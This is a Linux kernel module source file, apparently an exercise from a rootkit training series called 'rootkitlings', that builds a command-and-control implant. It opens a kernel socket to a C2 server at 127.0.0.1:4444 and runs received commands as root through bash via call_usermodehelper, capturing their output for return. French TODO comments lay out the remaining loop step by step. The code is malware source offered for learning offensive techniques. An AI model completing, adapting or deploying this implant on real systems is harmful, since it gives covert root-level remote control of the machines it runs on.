#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/sock.h>
#include <linux/inet.h>
#include <linux/umh.h>
#include <linux/fs.h>
#include <linux/byteorder/generic.h>
#include "protocol.h"

#define SERVER_IP    "127.0.0.1"
#define SERVER_PORT  4444
#define OUTPUT_FILE  "/tmp/rkl_out"

static struct task_struct *c2_thread = NULL;
static struct socket *sock = NULL;

/* --- helpers (provided) --- */

static int ksend(struct socket *s, const void *buf, size_t len)
{
	struct msghdr msg = {0};
	struct kvec vec = { .iov_base = (void *)buf, .iov_len = len };

	return kernel_sendmsg(s, &msg, &vec, 1, len);
}

static int krecv(struct socket *s, void *buf, size_t len)
{
	struct msghdr msg = {0};
	struct kvec vec = { .iov_base = buf, .iov_len = len };

	return kernel_recvmsg(s, &msg, &vec, 1, len, 0);
}

static int pack_msg(char *out, __u8 type, const char *data, __u32 data_len)
{
	__be32 net_len = htonl(data_len);

	out[0] = type;
	memcpy(out + 1, &net_len, 4);
	if (data_len > 0 && data)
		memcpy(out + C2_HEADER_SIZE, data, data_len);
	return C2_HEADER_SIZE + data_len;
}

static int unpack_hdr(const char *buf, __u8 *type, __u32 *length)
{
	__be32 net_len;

	*type = buf[0];
	memcpy(&net_len, buf + 1, 4);
	*length = ntohl(net_len);
	return 0;
}

static int exec_cmd(const char *cmd)
{
	char full_cmd[512];
	char *argv[] = {"/bin/bash", "-c", full_cmd, NULL};
	char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

	snprintf(full_cmd, sizeof(full_cmd), "%s > %s 2>&1", cmd, OUTPUT_FILE);
	return call_usermodehelper("/bin/bash", argv, envp, UMH_WAIT_PROC);
}

static int read_output(char *buf, size_t max_len)
{
	struct file *f;
	loff_t pos = 0;
	int ret;

	f = filp_open(OUTPUT_FILE, O_RDONLY, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);

	ret = kernel_read(f, buf, max_len - 1, &pos);
	filp_close(f, NULL);

	if (ret > 0)
		buf[ret] = '\0';
	return ret;
}

/* --- the C2 thread --- */

static int c2_thread_fn(void *data)
{
	struct sockaddr_in addr;
	char send_buf[C2_HEADER_SIZE + C2_MAX_DATA];
	char recv_buf[C2_HEADER_SIZE];
	char cmd_buf[C2_MAX_DATA];
	char out_buf[C2_MAX_DATA];
	__u8 msg_type;
	__u32 msg_len;
	int ret, total;

	/* Connect */
	ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
	if (ret < 0) {
		pr_err("rootkitlings/047: sock_create_kern failed: %d\n", ret);
		return ret;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(SERVER_PORT);
	addr.sin_addr.s_addr = in_aton(SERVER_IP);

	ret = kernel_connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
	if (ret < 0) {
		pr_err("rootkitlings/047: connect failed: %d\n", ret);
		sock_release(sock);
		sock = NULL;
		return ret;
	}

	pr_info("rootkitlings/047: connected to C2 server\n");

	while (!kthread_should_stop()) {

		// TODO(rootkitlings): implemente la boucle C2.
		//
		// 1. Envoie un HEARTBEAT:
		//    total = pack_msg(send_buf, C2_HEARTBEAT, NULL, 0);
		//    ksend(sock, send_buf, total);
		//
		// 2. Recois le header (C2_HEADER_SIZE octets):
		//    ret = krecv(sock, recv_buf, C2_HEADER_SIZE);
		//    Si ret <= 0, break (connexion fermee).
		//
		// 3. Parse le header:
		//    unpack_hdr(recv_buf, &msg_type, &msg_len);
		//
		// 4. Si msg_type == C2_CMD_REQUEST et msg_len > 0:
		//    a. Recois les data (msg_len octets) dans cmd_buf
		//    b. cmd_buf[msg_len] = '\0'
		//    c. pr_info la commande recue
		//    d. exec_cmd(cmd_buf)
		//    e. read_output(out_buf, sizeof(out_buf))
		//    f. Envoie une CMD_RESPONSE avec out_buf:
		//       total = pack_msg(send_buf, C2_CMD_RESPONSE, out_buf, strlen(out_buf));
		//       ksend(sock, send_buf, total);
		//
		// 5. Sinon, break (type inconnu ou heartbeat ack).
		//
		// ~10 lignes.

		break;
	}

	pr_info("rootkitlings/047: C2 loop ended\n");
	return 0;
}

static int __init c2loop_init(void)
{
	c2_thread = kthread_run(c2_thread_fn, NULL, "rootkitlings047");
	if (IS_ERR(c2_thread)) {
		pr_err("rootkitlings/047: failed to create thread\n");
		return PTR_ERR(c2_thread);
	}
	pr_info("rootkitlings/047: C2 thread started\n");
	return 0;
}

static void __exit c2loop_exit(void)
{
	if (sock) {
		sock_release(sock);
		sock = NULL;
	}
	pr_info("rootkitlings/047: cleaned up\n");
}

module_init(c2loop_init);
module_exit(c2loop_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rootkitlings 047: full C2 loop");
